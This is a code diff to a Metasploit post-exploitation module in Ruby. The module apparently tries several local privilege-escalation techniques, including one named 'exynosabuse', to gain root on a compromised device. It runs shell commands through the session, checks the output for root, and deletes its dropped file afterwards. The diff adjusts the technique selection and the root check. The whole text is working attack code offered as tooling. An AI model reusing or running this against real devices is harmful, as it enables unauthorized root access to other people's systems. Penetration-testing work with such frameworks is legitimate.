@@ -6,10 +6,6 @@
 ##
 
 require 'msf/core'
-require 'rex'
-require 'metasm'
-require 'msf/core/post/windows/priv'
-
 
 class Metasploit3 < Msf::Post
 
@@ -26,7 +22,7 @@ class Metasploit3 < Msf::Post
 		))
 
 		register_options([
-			OptInt.new('TECHNIQUE', [false, "Specify a particular technique to use (1-2), otherwise try them all", 0])
+			OptInt.new('TECHNIQUE', [false, "Specify a particular technique to use (1-3), otherwise try them all", 0])
 		], self.class)
 		
 		@techniques = [ 'su', 'run_root_shell', 'exynosabuse' ]
@@ -55,14 +51,14 @@ class Metasploit3 < Msf::Post
 		end
 
 		# finally, check if we have root
-		cmd << "whoami\n"
+		cmd << "id\n"
 
 		# run the commands in a channel
 		process = session.sys.process.execute("sh", "", {'Channelized' => true})
 		process.channel.write(cmd)
 		output = process.channel.read
-		if output == 'root'
-			print_good("got root")
+		if output =~ /root/
+			print_good("got root: " + output)
 			return true
 		else
 			print_error(output)
@@ -70,7 +66,9 @@ class Metasploit3 < Msf::Post
 			# cleanup
 			process.channel.close
 			process.close
-			session.fs.file.delete(filename)
+			if tech != 0
+				session.fs.file.delete(filename)
+			end
 			return false
 		end
 	end
@@ -82,7 +80,7 @@ class Metasploit3 < Msf::Post
 			use_technique(1)
 			use_technique(0)
 		else
-			use_technique(tech)
+			use_technique(tech - 1)
 		end
 	end
 
